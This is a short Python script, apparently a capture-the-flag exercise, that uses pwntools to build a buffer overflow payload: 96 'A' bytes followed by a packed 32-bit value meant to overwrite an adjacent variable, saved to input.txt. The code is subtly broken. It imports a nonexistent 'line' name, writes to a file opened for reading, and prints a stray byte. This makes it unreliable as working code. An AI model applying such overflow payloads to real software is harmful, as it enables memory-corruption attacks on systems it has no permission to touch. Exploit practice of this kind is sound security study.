from pwn import line, p32
firstVar = 1
f = open('input.txt')
print('\x02')
line1 :bytes = ('A' * 96).encode() + p32(firstVar)
print(line1)
f.write(line1.decode())
f.close()
